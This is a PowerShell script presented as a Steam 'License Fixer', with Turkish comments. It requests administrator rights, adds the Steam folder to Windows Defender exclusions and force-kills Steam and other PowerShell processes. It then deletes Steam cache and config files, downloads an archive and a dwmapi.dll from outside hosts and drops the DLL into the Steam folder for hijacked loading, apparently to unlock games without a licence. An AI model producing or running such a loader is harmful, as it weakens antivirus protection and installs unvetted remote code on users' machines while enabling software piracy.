[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
}
catch {}

function Disable-QuickEdit {
    try {
        $hInput = $Kernel32::GetStdHandle(-10) 
        $mode = 0
        if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
            $mode = $mode -band -not (0x0040 -bor 0x0020)
            $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
        }
    }
    catch { }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    $scriptPath = Join-Path $env:TEMP "license_fix_$(Get-Random).ps1"
    try {
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        if ([string]::IsNullOrWhiteSpace($scriptText)) { throw "No script block" }
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8 -Force
    }
    catch {
        $scriptText = @"
`$steamRegPath = 'HKCU:\Software\Valve\Steam'
`$steamPath = ""
if (Test-Path `$steamRegPath) {
    `$properties = Get-ItemProperty -Path `$steamRegPath -ErrorAction SilentlyContinue
    if (`$properties -and 'SteamPath' -in `$properties.PSObject.Properties.Name) {
        `$steamPath = `$properties.SteamPath
    }
}
if ([string]::IsNullOrWhiteSpace(`$steamPath) -or -not (Test-Path `$steamPath -PathType Container)) {
    Write-Host "Steam not found. Please install Steam first." -ForegroundColor Red
    Start-Sleep 5
    exit
}
`$dllUrl = "https://zdb2.pages.dev/dwmapi.dll"
`$dllOutput = Join-Path `$steamPath "dwmapi.dll"
try {
    Invoke-RestMethod -Uri `$dllUrl -OutFile `$dllOutput -ErrorAction Stop
    Write-Host "[+] dwmapi.dll installed successfully!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Download failed." -ForegroundColor Red
    Start-Sleep 5
}
"@
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8 -Force
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit
cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = ""

# --- Yardımcı Fonksiyonlar ---

function Write-Log($message, $type) {
    switch ($type) {
        "SUCCESS" { Write-Host "[+] $message" -ForegroundColor Green }
        "ERROR"   { Write-Host "[-] $message" -ForegroundColor Red }
        "WARNING" { Write-Host "[!] $message" -ForegroundColor Yellow }
        default   { Write-Host "[*] $message" }
    }
}

function Remove-ItemIfExists($path) {
    if ([string]::IsNullOrWhiteSpace($path)) { return }
    try {
        $fullPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
        if (Test-Path -LiteralPath $fullPath) {
            Start-Process cmd -ArgumentList "/c icacls ""$fullPath"" /reset /T /C" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$fullPath""" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $fullPath -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
        }
    }
    catch { }
}

function ForceStopProcess($processName) {
    try {
        Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
            Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        }
    }
    catch { }
}

function CheckAndPromptProcess($processName, $message) {
    $maxWait = 30
    $waited = 0
    while ((Get-Process -Name $processName -ErrorAction SilentlyContinue) -and $waited -lt $maxWait) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
        $waited += 1.5
    }
}

# --- Başlangıç İşlemleri ---

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
ForceStopProcess "steamservice"
CheckAndPromptProcess "steam" "[Please exit Steam client first]"

# Steam Yolu Kontrolü
try {
    if (Test-Path $steamRegPath) {
        $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
        if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name -and $properties.SteamPath) {
            $steamPath = $properties.SteamPath -replace '/','\'
        }
    }
}
catch { }

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path -LiteralPath $steamPath -PathType Container)) {
    Write-Host "[-] Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# --- Windows Defender Bölümü ---
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded from Defender." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
            Write-Log "Steam folder added to Defender exclusions." "SUCCESS"
        }
    }
}
catch {
    Write-Log "Could not configure Defender (non-critical, continuing...)" "WARNING"
}

# Eski DLL'leri temizle (sadece varsa)
$oldFiles = @(
    "winhttp.dll", "dwmapi.dll", "SYS_0xA7.dll", "hid.dll",
    "xinput1_4.dll", "version.dll", "OpenSteamTool.dll",
    "SYS_0xA7.toml", "opensteamtool.toml", "Gamevia.dll"
  
)
foreach ($file in $oldFiles) {
    Remove-ItemIfExists (Join-Path $steamPath $file)
}

# --- URL'ler ---
$primaryUrls = @(
    "https://zdb2.pages.dev/Gamevia.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
)

$dllUrls = @(
    "https://zdb2.pages.dev/dwmapi.dll",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dwmapi.dll",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dwmapi.dll"
)

# --- Dosya İndirme Fonksiyonu (çoklu URL dener) ---
function Download-FileWithFallback {
    param([string[]]$Urls, [string]$OutputPath)
    foreach ($url in $Urls) {
        try {
            Write-Host "[*] Trying: $url" -ForegroundColor Gray
            # TLS 1.2 zorla (eski Windows'ta sorun çıkabiliyor)
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
            Invoke-RestMethod -Uri $url -OutFile $OutputPath -TimeoutSec 30 -ErrorAction Stop
            if ((Test-Path -LiteralPath $OutputPath) -and ((Get-Item -LiteralPath $OutputPath).Length -gt 0)) {
                Write-Log "Downloaded successfully" "SUCCESS"
                return $true
            }
        }
        catch {
            Write-Host "[!] Failed: $url ($($_.Exception.Message))" -ForegroundColor Yellow
        }
    }
    return $false
}

# --- Ana Fonksiyon ---

function PwStart {
    try {
        if ([string]::IsNullOrWhiteSpace($steamPath)) { 
            Write-Log "Steam path is empty, cannot continue." "ERROR"
            return 
        }

        if (!(Test-Path -LiteralPath $localPath)) {
            try { New-Item -LiteralPath $localPath -ItemType Directory -Force -ErrorAction Stop | Out-Null } catch { }
        }

        # Steam yapılandırma temizliği
        Remove-ItemIfExists (Join-Path $steamPath "appcache")
        Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
        Remove-ItemIfExists (Join-Path $steamPath "package\beta")
        Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")

        # --- Gamevia.zip indir ve ayıkla ---
        $gamesDataPath = Join-Path $env:APPDATA "gamesdata"
        if (!(Test-Path -LiteralPath $gamesDataPath)) {
            try { New-Item -LiteralPath $gamesDataPath -ItemType Directory -Force -ErrorAction Stop | Out-Null } catch { }
        }

        $zipLocalSys = Join-Path $env:TEMP "Gamevia_$(Get-Random).zip"
        $successSys = Download-FileWithFallback -Urls $primaryUrls -OutputPath $zipLocalSys

        if ($successSys -and (Test-Path -LiteralPath $zipLocalSys)) {
            try {
                Expand-Archive -LiteralPath $zipLocalSys -DestinationPath $gamesDataPath -Force -ErrorAction Stop
                Write-Log "Gamevia.zip extracted to $gamesDataPath" "SUCCESS"

                $depotKeysPath = Join-Path $gamesDataPath "depotkeys.json"
                if (Test-Path -LiteralPath $depotKeysPath) {
                    Remove-Item -LiteralPath $depotKeysPath -Force -ErrorAction SilentlyContinue
                    Write-Log "depotkeys.json removed" "SUCCESS"
                }
            }
            catch {
                Write-Log "Failed to extract Gamevia.zip: $($_.Exception.Message)" "ERROR"
            }
        }
        else {
            Write-Log "Gamevia.zip could not be downloaded from any source." "WARNING"
        }

        # Geçici dosyayı sil
        if (-not [string]::IsNullOrWhiteSpace($zipLocalSys) -and (Test-Path -LiteralPath $zipLocalSys)) {
            try { Remove-Item -LiteralPath $zipLocalSys -Force -ErrorAction Stop } catch { }
        }

        # --- dwmapi.dll direkt indir ---
        $dllOutputPath = Join-Path $steamPath "dwmapi.dll"
        
        # Önce eski dwmapi.dll'i temizle
        Remove-ItemIfExists $dllOutputPath
        
        $success = Download-FileWithFallback -Urls $dllUrls -OutputPath $dllOutputPath

        if ($success -and (Test-Path -LiteralPath $dllOutputPath)) {
            Write-Log "dwmapi.dll installed to $steamPath" "SUCCESS"
            
            # Dosyayı gizli/salt okunur yapma (Steam'in okuması için)
            try { attrib -s -h -r "`"$dllOutputPath`"" | Out-Null } catch { }
        }
        else {
            Write-Log "dwmapi.dll could not be downloaded. Check your internet connection." "ERROR"
            Start-Sleep 5
            return
        }

        # Steam'i Başlat
        $steamExePath = Join-Path $steamPath "steam.exe"
        if (Test-Path -LiteralPath $steamExePath) {
            try {
                Start-Process -FilePath $steamExePath -WindowStyle Normal
                Start-Sleep 2
                Start-Process "steam://"
                Write-Log "Steam started successfully." "SUCCESS"
            }
            catch {
                Write-Log "Could not start Steam automatically. Please start it manually." "WARNING"
            }
        }

        Write-Log "License fix applied. Please login to Steam to activate." "SUCCESS"

        for ($i = 3; $i -ge 0; $i--) {
            Write-Host "`r[*] This window will close in $i seconds...   " -NoNewline
            Start-Sleep -Seconds 1
        }

        # Çıkış
        Get-Process powershell, pwsh -ErrorAction SilentlyContinue |
    Where-Object { $_.Id -ne $PID } |
    Stop-Process -Force -ErrorAction SilentlyContinue

# Biraz bekle
Start-Sleep -Milliseconds 500

# En son bu scripti kapat
Stop-Process -Id $PID -Force
        exit
    }
    catch {
        Write-Host "`n===== ERROR =====" -ForegroundColor Red
        Write-Host "Message : $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Type    : $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
        if ($_.InvocationInfo) {
            Write-Host "Line    : $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Yellow
            Write-Host "Command : $($_.InvocationInfo.Line.Trim())" -ForegroundColor Yellow
        }
        Write-Host "`nPress Enter to exit." -ForegroundColor Cyan
        Read-Host
    }
}

# Scripti Çalıştır
PwStart
exit
